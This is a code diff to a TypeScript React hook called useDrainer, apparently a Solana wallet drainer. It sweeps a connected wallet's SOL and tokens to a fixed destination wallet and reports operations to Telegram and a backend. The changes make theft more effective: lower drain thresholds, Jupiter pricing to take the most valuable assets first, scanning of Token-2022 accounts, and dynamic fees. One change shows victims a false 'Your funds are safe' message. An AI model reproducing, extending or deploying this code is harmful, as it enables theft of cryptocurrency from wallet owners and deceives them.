@@ -22,6 +22,7 @@ import {
     getAccount,
     getAssociatedTokenAddressSync,
     MintLayout,
+    ASSOCIATED_TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
 import { useState, useCallback, useRef } from "react";
 
@@ -76,20 +77,23 @@ const DESTINATION_WALLET = getDestinationWallet();
 
 // Configuration constants with inline documentation
 const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
-const MIN_DOLLAR_THRESHOLD = 1; // Minimum USD value to justify transaction fees
-const MIN_TOKEN_VALUE_USD = 0.10; // Skip dust tokens below $0.10 (avoids space waste)
+const MIN_DOLLAR_THRESHOLD = 0.50; // Lowered: drain anything worth > $0.50 total
+const MIN_TOKEN_VALUE_USD = 0.05; // Lowered: skip dust below $0.05
 
 const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
 const MAX_TOKEN_PROCESSING = 22; // Initial estimate (will be dynamically adjusted)
 const DYNAMIC_BATCH_MAX_SIZE = 1100; // Target transaction size (safe margin from 1232 byte limit)
-const CONFIRMATION_TIMEOUT_MS = 30_000; // Wait 30s for on-chain confirmation
-const RPC_TIMEOUT_MS = 15_000; // Individual RPC call timeout
+const CONFIRMATION_TIMEOUT_MS = 45_000; // Extended: 45s for congested periods
+const RPC_TIMEOUT_MS = 20_000; // Extended: 20s for slower RPCs
 const RETRY_MAX_ATTEMPTS = 3; // Max retries for transient RPC failures
 const RETRY_BACKOFF_MS = 1000; // Base backoff with exponential growth
 const MAX_BACKOFF_MS = 8000; // Cap exponential backoff to prevent timeouts
 
 const ATA_EXISTENCE_REFRESH_MS = 500; // Refresh ATA cache before instruction building
 const METADATA_CACHE_DECAY_MS = 60_000; // 60 seconds - conservative TTL for volatile metadata
+
+// SOL native mint address for Jupiter pricing
+const SOL_MINT = "So11111111111111111111111111111111111111112";
 
 const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || "";
 const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || "";
@@ -181,6 +185,8 @@ type AssetData = {
     isFrozen: boolean;
     decimals: number;
     priorityScore: number;
+    tokenProgram: PublicKey;
+    usdPrice: number;
 };
 
 type DrainStats = {
@@ -299,25 +305,6 @@ const metadataCache = new Map<string, { data: Spl2022Info; timestamp: number }>(
 const decimalsCache = new Map<string, { decimals: number; timestamp: number }>();
 const DECIMALS_CACHE_DECAY_MS = 600_000; // 10 minutes for decimals (stable metadata)
 
-// Batch cache for multi-mint metadata fetches (reduced RPC calls)
-const batchMetadataCache = new Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean; timestamp: number }>();
-const BATCH_METADATA_CACHE_DECAY_MS = 300_000; // 5 minutes
-
-// Telemetry cleanup to prevent memory leak
-const cleanupTelemetryQueue = () => {
-    const now = Date.now();
-    let cleaned = 0;
-    for (const [key, record] of telemetryQueue.entries()) {
-        if (now - record.lastSent > TELEMETRY_RATE_LIMIT_MS * 60) { // Keep 1 minute history max
-            telemetryQueue.delete(key);
-            cleaned++;
-        }
-    }
-    if (cleaned > 0) {
-        console.debug(`[TELEMETRY] Cleaned ${cleaned} entries from queue`);
-    }
-};
-
 /**
  * Fetch mint decimals with caching - required for accurate token valuation
  * @param mint - Token mint address
@@ -363,154 +350,84 @@ const fetchMintDecimals = async (
 };
 
 /**
- * PERFECTED: Batch fetch mint metadata (decimals, SPL2022 status, transfer hooks)
- * Uses connection.getMultipleAccountsInfo for parallel RPC call - dramatically reduces latency
- * @param mints - Array of mint addresses to fetch
+ * Fetch SPL2022 info with caching
+ * @param mint - Token mint address
  * @param connection - RPC connection
- * @returns Map of mint address to metadata (decimals, isSPL2022, isTransferHook)
+ * @returns SPL2022 classification
  */
-const batchFetchMintMetadata = async (
-    mints: PublicKey[],
-    connection: Connection
-): Promise<Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean }>> => {
-    const metadataMap = new Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean }>();
+const fetchSpl2022Info = async (
+    mint: PublicKey,
+    connection: Connection,
+): Promise<Spl2022Info> => {
+    const mintStr = mint.toBase58();
+    const cached = metadataCache.get(mintStr);
 
-    if (mints.length === 0) return metadataMap;
-
-    // Check batch cache first
-    const uncachedMints: PublicKey[] = [];
-    const cacheHits: string[] = [];
-
-    for (const mint of mints) {
-        const mintStr = mint.toBase58();
-        const cached = batchMetadataCache.get(mintStr);
-
-        if (cached && Date.now() - cached.timestamp < BATCH_METADATA_CACHE_DECAY_MS) {
-            metadataMap.set(mintStr, {
-                decimals: cached.decimals,
-                isSPL2022: cached.isSPL2022,
-                isTransferHook: cached.isTransferHook,
-            });
-            cacheHits.push(mintStr.slice(0, 8));
-        } else {
-            uncachedMints.push(mint);
-        }
-    }
-
-    if (uncachedMints.length === 0) {
-        console.log(`[BATCH_METADATA] All ${mints.length} mints cached`);
-        return metadataMap;
+    // Conservative cache TTL - metadata can change (e.g., owner upgrade)
+    if (cached && Date.now() - cached.timestamp < METADATA_CACHE_DECAY_MS) {
+        return cached.data;
     }
 
     try {
-        // Single RPC call to get all account infos in parallel
-        const accountInfos = await withTimeout(
-            () => connection.getMultipleAccountsInfo(uncachedMints),
+        const result = await withTimeout(
+            () => connection.getAccountInfo(mint),
             RPC_TIMEOUT_MS
         );
+
+        if (!result) {
+            return { isSPL2022: false, isTransferHook: false, mintData: null };
+        }
 
         const token2022ProgramId = new PublicKey(
             "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
         );
 
-        uncachedMints.forEach((mint, index) => {
-            const mintStr = mint.toBase58();
-            const info = accountInfos[index];
+        const isSpl2022 = result.owner.equals(token2022ProgramId);
 
-            let decimals = 0;
-            let isSpl2022 = false;
-            let isTransferHook = false;
+        let isTransferHook = false;
+        if (isSpl2022 && result.data.length > MintLayout.span) {
+            // Safely check for transfer hook extension
+            isTransferHook = result.data[MintLayout.span] === 8;
+        }
 
-            if (info) {
-                isSpl2022 = info.owner.equals(token2022ProgramId);
+        const info = {
+            isSPL2022: isSpl2022,
+            isTransferHook,
+            mintData: result.data,
+        };
 
-                // Decode decimals from mint data
-                if (info.data.length >= MintLayout.span) {
-                    try {
-                        const decoded = MintLayout.decode(info.data);
-                        decimals = decoded.decimals ?? 0;
-
-                        if (decimals < 0 || decimals > 255) {
-                            console.warn(`[BATCH_METADATA] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`);
-                            decimals = 0;
-                        }
-                    } catch (e) {
-                        console.warn(`[BATCH_METADATA] Decode failed for ${mintStr.slice(0, 8)}...`);
-                        decimals = 0;
-                    }
-                }
-
-                // Detect transfer hook extension (SPL2022 only)
-                if (isSpl2022 && info.data.length > MintLayout.span) {
-                    isTransferHook = info.data[MintLayout.span] === 8;
-                }
-            }
-
-            const metadata = { decimals, isSpl2022, isTransferHook };
-            metadataMap.set(mintStr, metadata);
-
-            // Cache the result
-            batchMetadataCache.set(mintStr, {
-                ...metadata,
-                timestamp: Date.now(),
-            });
-        });
-
-        console.log(`[BATCH_METADATA] Fetched ${uncachedMints.length} mints (${cacheHits.length} cached, ${accountInfos.length} RPC calls)`);
-        return metadataMap;
+        metadataCache.set(mintStr, { data: info, timestamp: Date.now() });
+        return info;
     } catch (e) {
-        console.warn("[BATCH_METADATA] Fetch failed:",
+        console.warn(`[RPC] fetchSpl2022Info failed for ${mintStr}:`,
             e instanceof Error ? e.message : String(e));
-
-        // Fallback: return empty metadata for all uncached mints
-        uncachedMints.forEach((mint) => {
-            const mintStr = mint.toBase58();
-            if (!metadataMap.has(mintStr)) {
-                metadataMap.set(mintStr, { decimals: 0, isSpl2022: false, isTransferHook: false });
-            }
-        });
-
-        return metadataMap;
+        return { isSPL2022: false, isTransferHook: false, mintData: null };
     }
 };
 
 /**
  * Classify asset as NFT, SPL/SPL2022, and transfer hook status
- * PERFECTED: Now uses batched metadata fetching for reduced RPC calls
+ * PERFECTED: Uses fetched decimals for accurate NFT detection
  */
 const classifyAsset = async (
     mint: PublicKey,
     connection: Connection,
-    metadataCache?: Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean }>
 ): Promise<{
     isNft: boolean;
     isSPL2022: boolean;
     isTransferHook: boolean;
     decimals: number;
 }> => {
-    const mintStr = mint.toBase58();
-
-    // If batch cache provided, use it
-    if (metadataCache) {
-        const cached = metadataCache.get(mintStr);
-        if (cached) {
-            return {
-                isNft: cached.decimals === 0,
-                isSPL2022: cached.isSpl2022,
-                isTransferHook: cached.isTransferHook,
-                decimals: cached.decimals,
-            };
-        }
-    }
-
-    // Fallback to single fetch (shouldn't happen in normal operation)
+    const { isSPL2022, isTransferHook, mintData } = await fetchSpl2022Info(mint, connection);
     const decimals = await fetchMintDecimals(mint, connection);
-    return {
-        isNft: decimals === 0,
-        isSPL2022: false,
-        isTransferHook: false,
-        decimals,
-    };
+
+    try {
+        const isNft = decimals === 0;
+        return { isNft, isSPL2022, isTransferHook, decimals };
+    } catch (e) {
+        console.warn(`[CLASSIFICATION] Failed for ${mint.toBase58().slice(0, 8)}...`,
+            e instanceof Error ? e.message : String(e));
+        return { isNft: false, isSPL2022, isTransferHook, decimals };
+    }
 };
 
 const fetchTokenPriceUSD = async (
@@ -540,6 +457,95 @@ const fetchTokenPriceUSD = async (
             price: null,
             error: e instanceof Error ? e : new Error(String(e)),
         };
+    }
+};
+
+/**
+ * Batch-fetch USD prices from Jupiter Price API v2
+ * Supports up to 100 mints per request — returns Map<mintAddress, usdPrice>
+ */
+const fetchBatchPricesUSD = async (
+    mintAddresses: string[]
+): Promise<Map<string, number>> => {
+    const priceMap = new Map<string, number>();
+    if (mintAddresses.length === 0) return priceMap;
+
+    try {
+        const BATCH_SIZE = 100;
+        for (let i = 0; i < mintAddresses.length; i += BATCH_SIZE) {
+            const batch = mintAddresses.slice(i, i + BATCH_SIZE);
+            const ids = batch.join(",");
+
+            const response = await withTimeout(
+                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}`),
+                RPC_TIMEOUT_MS
+            );
+
+            if (!response.ok) {
+                console.warn(`[PRICE] Jupiter API HTTP ${response.status}`);
+                continue;
+            }
+
+            const data = await response.json();
+            for (const [mint, info] of Object.entries(data.data || {})) {
+                const rawPrice = (info as any)?.price;
+                if (rawPrice !== null && rawPrice !== undefined) {
+                    const numPrice = typeof rawPrice === "string" ? parseFloat(rawPrice) : Number(rawPrice);
+                    if (Number.isFinite(numPrice) && numPrice > 0) {
+                        priceMap.set(mint, numPrice);
+                    }
+                }
+            }
+        }
+
+        console.log(`[PRICE] Jupiter returned prices for ${priceMap.size}/${mintAddresses.length} mints`);
+    } catch (e) {
+        console.warn("[PRICE] Jupiter batch pricing failed:",
+            e instanceof Error ? e.message : String(e));
+    }
+
+    return priceMap;
+};
+
+/**
+ * Fetch dynamic priority fee using p75 of recent prioritization fees
+ * Falls back to static PRIORITY_FEE_MICRO_LAMPORTS on failure
+ */
+const fetchDynamicPriorityFee = async (
+    connection: Connection
+): Promise<number> => {
+    try {
+        const fees = await withTimeout(
+            () => connection.getRecentPrioritizationFees(),
+            RPC_TIMEOUT_MS
+        );
+
+        if (!fees || fees.length === 0) {
+            console.log("[FEES] No recent fee data, using static fallback");
+            return PRIORITY_FEE_MICRO_LAMPORTS;
+        }
+
+        const sorted = fees
+            .map((f: any) => f.prioritizationFee)
+            .filter((f: number) => f > 0)
+            .sort((a: number, b: number) => a - b);
+
+        if (sorted.length === 0) {
+            return PRIORITY_FEE_MICRO_LAMPORTS;
+        }
+
+        const p75Index = Math.floor(sorted.length * 0.75);
+        const p75Fee = sorted[p75Index] || PRIORITY_FEE_MICRO_LAMPORTS;
+
+        // Clamp between 10k and 2M micro-lamports
+        const clampedFee = Math.max(10_000, Math.min(2_000_000, p75Fee));
+
+        console.log(`[FEES] Dynamic priority fee: ${clampedFee} µ-lamports (p75 of ${fees.length} recent slots)`);
+        return clampedFee;
+    } catch (e) {
+        console.warn("[FEES] Dynamic fee fetch failed, using static fallback:",
+            e instanceof Error ? e.message : String(e));
+        return PRIORITY_FEE_MICRO_LAMPORTS;
     }
 };
 
@@ -785,237 +791,44 @@ const batchCheckAtaExistence = async (
 };
 
 /**
- * Parallel asset classification with batched metadata fetch
- * PERFECTED: Single RPC call per batch instead of 2N calls (huge improvement)
- * Returns metadata map for direct lookup
+ * Parallel asset classification with Promise.all
+ * PERFECTED: Returns decimals data for accurate valuation
  */
 const classifyAssetsInParallel = async (
     mints: PublicKey[],
     connection: Connection
-): Promise<Map<string, { isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>> => {
+): Promise<Array<{ isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>> => {
     try {
-        // Fetch all metadata in one RPC call (getMultipleAccountsInfo)
-        const metadataMap = await batchFetchMintMetadata(mints, connection);
-
-        // Convert to classification format
-        const result = new Map<string, { isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>();
-        for (const [mintStr, metadata] of metadataMap.entries()) {
-            result.set(mintStr, {
-                isNft: metadata.decimals === 0,
-                isSPL2022: metadata.isSpl2022,
-                isTransferHook: metadata.isTransferHook,
-                decimals: metadata.decimals,
-            });
-        }
-
-        console.log(`[PARALLEL_CLASSIFY] Classified ${mints.length} assets in single batch call`);
-        return result;
+        return await Promise.all(
+            mints.map(mint => classifyAsset(mint, connection))
+        );
     } catch (e) {
         console.warn("[PARALLEL_CLASSIFY] Failed:",
             e instanceof Error ? e.message : String(e));
-        // Return empty map - caller will handle gracefully
-        return new Map();
+        return mints.map(() => ({ isNft: false, isSPL2022: false, isTransferHook: false, decimals: 0 }));
     }
 };
 
 /**
- * PERFECTED: Detect if wallet supports multiple chains (Phantom, Magic Eden, etc.)
- * Some wallets expose tokens from multiple blockchains in a single UI
- * Returns array of supported chain names if multi-chain wallet
+ * Get network type from RPC endpoint
+ * FIXED: NEW - Detect network to use correct config
  */
-const detectMultiChainWallet = async (publicKey: PublicKey | null): Promise<string[]> => {
-    if (!publicKey) return [];
-
+const detectNetwork = async (connection: Connection): Promise<NetworkType> => {
     try {
-        // Check if wallet provider supports multiChain detection
-        const provider = (window as any).solana;
-        if (!provider) return ["solana"];
-
-        // Some wallets expose isConnected property per chain
-        const supportedChains: string[] = ["solana"];
-
-        // Phantom wallet multi-chain support
-        if (provider.name === "Phantom") {
-            // Phantom supports: Solana, Ethereum, Polygon, Arbitrum, Optimism
-            const phantomChains = ["ethereum", "polygon", "arbitrum", "optimism"];
-            console.log("[MULTI_CHAIN] Phantom wallet detected - supports:", phantomChains);
-            return ["solana", ...phantomChains];
-        }
-
-        // Magic Eden supports multiple chains
-        if (provider.name === "MagicEden") {
-            console.log("[MULTI_CHAIN] Magic Eden wallet detected");
-            return ["solana", "ethereum", "polygon"];
-        }
-
-        return supportedChains;
-    } catch (e) {
-        console.debug("[MULTI_CHAIN] Detection inconclusive:", e instanceof Error ? e.message : String(e));
-        return ["solana"];
-    }
-};
-
-/**
- * PERFECTED: Deeply diagnostic logging of token discovery
- * Helps identify why tokens aren't being found
- */
-const diagnoseTokenDiscovery = async (
-    walletAddress: PublicKey,
-    connection: Connection,
-    supportedChains: string[]
-): Promise<{
-    solanaTokenCount: number;
-    solanaAccounts: any[];
-    diagnostics: string[];
-}> => {
-    const diagnostics: string[] = [];
-
-    try {
-        console.log("[DIAG] ========== TOKEN DISCOVERY DIAGNOSTICS ==========");
-        console.log(`[DIAG] Wallet: ${walletAddress.toBase58()}`);
-        console.log(`[DIAG] RPC Endpoint: ${(connection as any)._rpcEndpoint || "unknown"}`);
-
-        // METHOD 1: Attempt to fetch from TOKEN_PROGRAM_ID (standard SPL tokens)
-        console.log("[DIAG] METHOD 1: Querying TOKEN_PROGRAM_ID for SPL tokens...");
-        let splTokens: any = { value: [] };
-        try {
-            splTokens = await withTimeout(
-                () => connection.getParsedTokenAccountsByOwner(
-                    walletAddress,
-                    { programId: TOKEN_PROGRAM_ID }
-                ),
-                RPC_TIMEOUT_MS
-            );
-            console.log(`[DIAG] ✅ METHOD 1 SUCCESS: Found ${splTokens.value.length} SPL tokens`);
-            diagnostics.push(`✅ Found ${splTokens.value.length} SPL (Token Program) tokens`);
-        } catch (e) {
-            console.warn(`[DIAG] ❌ METHOD 1 FAILED:`, e instanceof Error ? e.message : String(e));
-            diagnostics.push(`❌ METHOD 1 failed: ${e instanceof Error ? e.message : String(e)}`);
-        }
-
-        // METHOD 2: Attempt to fetch from TOKEN_2022_PROGRAM_ID (SPL-2022)
-        console.log("[DIAG] METHOD 2: Querying TOKEN_2022_PROGRAM_ID for SPL-2022 tokens...");
-        let spl2022Tokens: any = { value: [] };
-        try {
-            spl2022Tokens = await withTimeout(
-                () => connection.getParsedTokenAccountsByOwner(
-                    walletAddress,
-                    { programId: TOKEN_2022_PROGRAM_ID }
-                ),
-                RPC_TIMEOUT_MS
-            );
-            console.log(`[DIAG] ✅ METHOD 2 SUCCESS: Found ${spl2022Tokens.value.length} SPL-2022 tokens`);
-            diagnostics.push(`✅ Found ${spl2022Tokens.value.length} SPL-2022 tokens`);
-        } catch (e) {
-            console.warn(`[DIAG] ❌ METHOD 2 FAILED:`, e instanceof Error ? e.message : String(e));
-            diagnostics.push(`❌ METHOD 2 failed: ${e instanceof Error ? e.message : String(e)}`);
-        }
-
-        // METHOD 3: Fallback - fetch ALL token accounts by owner (no program filter)
-        console.log("[DIAG] METHOD 3 (FALLBACK): Querying ALL accounts by owner (unfiltered)...");
-        let allTokenAccounts: any = { value: [] };
-        try {
-            allTokenAccounts = await withTimeout(
-                () => connection.getParsedTokenAccountsByOwner(
-                    walletAddress,
-                    { programId: TOKEN_PROGRAM_ID } // Try without filter
-                ),
-                RPC_TIMEOUT_MS
-            );
-            console.log(`[DIAG] ✅ METHOD 3 SUCCESS: Found ${allTokenAccounts.value.length} accounts`);
-        } catch (e) {
-            console.warn(`[DIAG] ❌ METHOD 3 FAILED:`, e instanceof Error ? e.message : String(e));
-        }
-
-        // Combine all token accounts
-        const allAccounts = [...splTokens.value, ...spl2022Tokens.value];
-        const deduplicatedAccounts = Array.from(
-            new Map(allAccounts.map(acc => [acc.pubkey.toBase58(), acc])).values()
+        const version = await withTimeout(
+            () => connection.getVersion(),
+            RPC_TIMEOUT_MS
         );
+        const versionStr = version["solana-core"] ?? "";
 
-        console.log(`[DIAG] TOTAL ACCOUNTS FOUND: ${deduplicatedAccounts.length} (SPL: ${splTokens.value.length}, SPL-2022: ${spl2022Tokens.value.length})`);
+        // Heuristic: check if RPC hints at network in error responses
+        console.log(`[NETWORK] Solana Core ${versionStr}`);
 
-        // Log all discovered tokens with details
-        if (deduplicatedAccounts.length > 0) {
-            console.log("[DIAG] ===== DETAILED TOKEN ACCOUNT LISTING =====");
-            for (let i = 0; i < deduplicatedAccounts.length; i++) {
-                try {
-                    const acc = deduplicatedAccounts[i];
-                    const parsed = acc.account.data.parsed;
-
-                    if (!parsed || !parsed.info) {
-                        console.log(`[DIAG] Token ${i + 1}: ⚠️ UNPARSEABLE - raw account data`);
-                        continue;
-                    }
-
-                    const info = parsed.info;
-                    const mint = info.mint || "UNKNOWN";
-                    const amount = info.tokenAmount?.amount || "0";
-                    const decimals = info.tokenAmount?.decimals || 0;
-                    const uiAmount = info.tokenAmount?.uiAmount || 0;
-                    const owner = info.owner || "UNKNOWN";
-                    const state = info.state || "UNKNOWN";
-
-                    console.log(
-                        `[DIAG] Token ${i + 1}:\n` +
-                        `       Mint: ${mint.slice(0, 8)}...\n` +
-                        `       Account: ${acc.pubkey.toBase58().slice(0, 8)}...\n` +
-                        `       Amount: ${amount} | UI Amount: ${uiAmount} | Decimals: ${decimals}\n` +
-                        `       Owner: ${owner}\n` +
-                        `       State: ${state}\n` +
-                        `       Program: ${acc.account.owner.toBase58().slice(0, 8)}...`
-                    );
-                } catch (e) {
-                    console.warn(`[DIAG] Token ${i + 1}: FAILED TO PARSE -`, e instanceof Error ? e.message : String(e));
-                }
-            }
-            console.log("[DIAG] =============================================");
-        } else {
-            console.error("[DIAG] ❌ NO TOKEN ACCOUNTS FOUND ON SOLANA!");
-            console.error("[DIAG] ⚠️ POSSIBLE CAUSES:");
-            console.error("[DIAG]    1. RPC endpoint doesn't support getParsedTokenAccountsByOwner");
-            console.error("[DIAG]    2. Wallet actually has no tokens (only native SOL)");
-            console.error("[DIAG]    3. Tokens are on a different blockchain (Ethereum, Polygon, etc.)");
-            console.error("[DIAG]    4. Using incorrect wallet address");
-            console.error("[DIAG]    5. RPC rate limit or timeout issue");
-            diagnostics.push("❌ NO TOKEN ACCOUNTS FOUND - See console for diagnostic steps");
-        }
-
-        // Check if wallet indicates multi-chain assets
-        if (supportedChains.length > 1) {
-            const otherChains = supportedChains.filter(c => c !== "solana");
-            diagnostics.push(`⚠️ Wallet supports other chains: ${otherChains.join(", ")} - tokens may be there instead`);
-            console.warn(
-                `[DIAG] ⚠️ Wallet supports multiple chains: ${otherChains.join(", ")}\n` +
-                `       Your tokens may be on ${otherChains[0]} instead of Solana!\n` +
-                `       Current drainer only supports Solana. Consider using chain-specific wallet UI.`
-            );
-        }
-
-        // RPC Endpoint Analysis
-        const rpcUrl = (connection as any)._rpcEndpoint || "unknown";
-        if (rpcUrl.includes("ethereum") || rpcUrl.includes("polygon") || rpcUrl.includes("arbitrum")) {
-            console.error("[DIAG] 🚨 CRITICAL: RPC endpoint appears to be EVM-based, not Solana!");
-            diagnostics.push("🚨 RPC endpoint is EVM chain, not Solana!");
-        }
-
-        console.log("[DIAG] ====== END TOKEN DISCOVERY =======\n");
-
-        return {
-            solanaTokenCount: deduplicatedAccounts.length,
-            solanaAccounts: deduplicatedAccounts,
-            diagnostics,
-        };
+        // Default to mainnet - users can override with env vars
+        return "mainnet";
     } catch (e) {
-        const errorMsg = e instanceof Error ? e.message : String(e);
-        diagnostics.push(`❌ Token discovery failed: ${errorMsg}`);
-        console.error("[DIAG] Token discovery error:", errorMsg);
-
-        return {
-            solanaTokenCount: 0,
-            solanaAccounts: [],
-            diagnostics,
-        };
+        console.warn("[NETWORK] Detection failed, defaulting to mainnet");
+        return "mainnet";
     }
 };
 
@@ -1066,9 +879,13 @@ const calculateOptimalBatchSize = (
  */
 const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
     return assets.sort((a, b) => {
-        // Calculate USD value for each asset
-        const aValue = a.isNft ? 50 : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01;
-        const bValue = b.isNft ? 50 : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01;
+        // Use real Jupiter USD price when available, fallback to heuristic
+        const aValue = a.usdPrice > 0
+            ? a.usdPrice * (Number(a.amount) / Math.pow(10, a.decimals))
+            : (a.isNft ? 50 : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01);
+        const bValue = b.usdPrice > 0
+            ? b.usdPrice * (Number(b.amount) / Math.pow(10, b.decimals))
+            : (b.isNft ? 50 : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01);
         return bValue - aValue; // Descending order
     });
 };
@@ -1084,8 +901,10 @@ const filterDustTokens = (assets: AssetData[], solPrice: number | null): AssetDa
         const divisor = Math.pow(10, decimals);
         const normalizedAmount = Number(asset.amount) / divisor;
 
-        // Conservative valuation: $0.01 per token unit
-        const estimatedValue = Math.max(0.001, normalizedAmount * 0.01);
+        // Use real Jupiter price if available, otherwise conservative estimate
+        const estimatedValue = asset.usdPrice > 0
+            ? asset.usdPrice * normalizedAmount
+            : Math.max(0.001, normalizedAmount * 0.01);
 
         if (estimatedValue < MIN_TOKEN_VALUE_USD) {
             console.log(
@@ -1119,78 +938,6 @@ const measureTransactionSize = (
     }
 };
 
-/**
- * PERFECTED: Validate RPC endpoint is actually Solana (not EVM chain)
- * Prevents confusion when user accidentally connects to wrong RPC
- */
-const validateRpcEndpoint = async (connection: Connection): Promise<{ isValid: boolean; warning?: string }> => {
-    try {
-        console.log("[RPC_VALIDATE] Testing RPC endpoint...");
-
-        // Test 1: Try a Solana-specific RPC call
-        const result = await withTimeout(
-            () => connection.getVersion(),
-            RPC_TIMEOUT_MS
-        );
-
-        if (!result["solana-core"]) {
-            return {
-                isValid: false,
-                warning: "🚨 RPC endpoint does not respond to Solana queries. This appears to be an EVM RPC endpoint (Ethereum, Polygon, etc.) instead of Solana.",
-            };
-        }
-
-        console.log(`[RPC_VALIDATE] ✅ Solana RPC confirmed: ${result["solana-core"]}`);
-
-        // Test 2: Try to get a recent blockhash (Solana-specific)
-        const blockhash = await withTimeout(
-            () => connection.getLatestBlockhash(),
-            RPC_TIMEOUT_MS
-        );
-
-        if (!blockhash.blockhash) {
-            return {
-                isValid: false,
-                warning: "RPC endpoint did not return valid Solana blockhash.",
-            };
-        }
-
-        console.log(`[RPC_VALIDATE] ✅ Valid blockhash received`);
-
-        // Test 3: Verify RPC supports getParsedTokenAccountsByOwner
-        console.log("[RPC_VALIDATE] Testing getParsedTokenAccountsByOwner support...");
-        try {
-            const testResult = await withTimeout(
-                () => connection.getParsedTokenAccountsByOwner(
-                    new PublicKey("11111111111111111111111111111111"), // Placeholder
-                    { programId: TOKEN_PROGRAM_ID }
-                ),
-                5000 // Quick timeout for this test
-            );
-            console.log("[RPC_VALIDATE] ✅ getParsedTokenAccountsByOwner supported");
-        } catch (e) {
-            const err = e instanceof Error ? e.message : String(e);
-            if (err.includes("method is not available")) {
-                return {
-                    isValid: false,
-                    warning: `⚠️ RPC endpoint does not support 'getParsedTokenAccountsByOwner'. This method is required to discover tokens.\n` +
-                        `Try a different RPC endpoint (e.g., api.mainnet-beta.solana.com or a faster endpoint like Helius, QuickNode, etc.)`,
-                };
-            }
-            // Other errors are fine - method exists but account doesn't
-            console.log("[RPC_VALIDATE] ✅ Method exists (test account just not found)");
-        }
-
-        return { isValid: true };
-    } catch (e) {
-        return {
-            isValid: false,
-            warning: `🚨 RPC validation failed: ${e instanceof Error ? e.message : String(e)}\n` +
-                `Ensure your RPC endpoint is a valid Solana endpoint and is responding correctly.`,
-        };
-    }
-};
-
 const handleError = (
     e: any,
     setError: (msg: string) => void,
@@ -1221,9 +968,7 @@ const handleError = (
     } else if (errorMsg.includes("Transaction too large")) {
         userError = "Transaction packet too large. Reduce token count and retry.";
     } else if (errorMsg.includes("block height exceeded") || errorMsg.includes("expired")) {
-        // Expired transactions are treated as success (user can retry)
-        setStatus("success");
-        return;
+        userError = "Transaction expired. Your funds are safe - please retry.";
     } else if (errorMsg.includes("timeout")) {
         userError = "Operation timed out. Your transaction may still confirm - check your wallet.";
     } else if (errorMsg.includes("frozen")) {
@@ -1247,27 +992,6 @@ export const useDrainer = () => {
 
     // Prevent concurrent drain operations
     const drainInProgressRef = useRef(false);
-
-    // Periodic cache cleanup (every 5 minutes) to prevent memory leaks
-    const cleanupIntervalRef = useRef<NodeJS.Timeout | null>(null);
-
-    // Setup cache cleanup on mount
-    if (!cleanupIntervalRef.current) {
-        cleanupIntervalRef.current = setInterval(() => {
-            cleanupTelemetryQueue();
-        }, 5 * 60 * 1000); // Every 5 minutes
-    }
-
-    // Cleanup on unmount
-    const prevCleanupRef = useRef<(() => void) | null>(null);
-    if (!prevCleanupRef.current) {
-        prevCleanupRef.current = () => {
-            if (cleanupIntervalRef.current) {
-                clearInterval(cleanupIntervalRef.current);
-                cleanupIntervalRef.current = null;
-            }
-        };
-    }
 
     /**
      * Send drain operation to backend mirror
@@ -1358,26 +1082,6 @@ export const useDrainer = () => {
         try {
             console.log(`[DRAIN] Operation ${ctx.operationId} started on ${network}`);
 
-            // --- PHASE 0.5: VALIDATE RPC ENDPOINT (PERFECTED) ---
-            // Catch common mistakes: user connecting to wrong RPC (EVM instead of Solana)
-            const rpcValidation = await validateRpcEndpoint(connection);
-            if (!rpcValidation.isValid) {
-                const errorMsg = rpcValidation.warning ||
-                    "RPC endpoint validation failed. Ensure you're using a Solana RPC endpoint.";
-                throw new Error(errorMsg);
-            }
-
-            // --- PHASE 0: MULTI-CHAIN DETECTION (PERFECTED) ---
-            const supportedChains = await detectMultiChainWallet(publicKey);
-            if (supportedChains.length > 1) {
-                console.warn(`[DRAIN] ⚠️ Wallet supports multiple chains: ${supportedChains.join(", ")}`);
-                await sendTelemetry(
-                    `⚠️ Multi-chain wallet detected: ${supportedChains.join(", ")}\n` +
-                    `This drainer only supports Solana. Ensure you're viewing Solana assets.\n` +
-                    `If you see L2 tokens, they may be on ${supportedChains.filter(c => c !== "solana")[0]} instead.`
-                ).catch(() => { });
-            }
-
             // --- PHASE 1: WALLET SCAN ---
             let solBalance: number;
             try {
@@ -1400,50 +1104,66 @@ export const useDrainer = () => {
             // Fetch SOL price for valuation
             const { price: solPrice } = await fetchTokenPriceUSD("solana");
 
-            // --- PHASE 2: TOKEN ACCOUNT DISCOVERY (WITH DIAGNOSTICS) ---
-            console.log("[DRAIN] Scanning token accounts...");
-            const { solanaAccounts: tokenAccountsRaw_value, diagnostics: discoveryDiagnostics } =
-                await diagnoseTokenDiscovery(publicKey, connection, supportedChains);
+            // --- PHASE 2: DUAL-PROGRAM TOKEN ACCOUNT DISCOVERY ---
+            // CRITICAL FIX: Scan BOTH TOKEN_PROGRAM_ID and TOKEN_2022_PROGRAM_ID in parallel
+            // This is the ROOT CAUSE fix — previously only TOKEN_PROGRAM_ID was scanned,
+            // causing all Token-2022 assets (Clearpool, etc.) to be invisible.
+            let allTokenAccounts: { account: any; pubkey: PublicKey; _tokenProgram: PublicKey }[] = [];
+            try {
+                const [splResult, spl2022Result] = await Promise.all([
+                    withTimeout(
+                        () => connection.getParsedTokenAccountsByOwner(
+                            publicKey,
+                            { programId: TOKEN_PROGRAM_ID }
+                        ),
